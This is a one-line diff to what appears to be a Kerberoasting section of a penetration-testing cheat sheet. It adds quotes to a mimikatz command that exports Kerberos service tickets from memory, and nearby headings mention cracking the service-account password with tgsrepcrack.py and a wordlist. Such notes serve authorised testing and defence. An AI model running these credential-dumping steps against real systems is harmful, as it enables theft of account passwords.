@@ -200,7 +200,7 @@ klist
 
 -> Export service tickets from memory
 ```
-./mimikatz.exe kerberos::list /export
+./mimikatz.exe "kerberos::list /export"
 ```
 
 -> Wordlist Attack with tgsrepcrack.py to get the clear text password for the service account
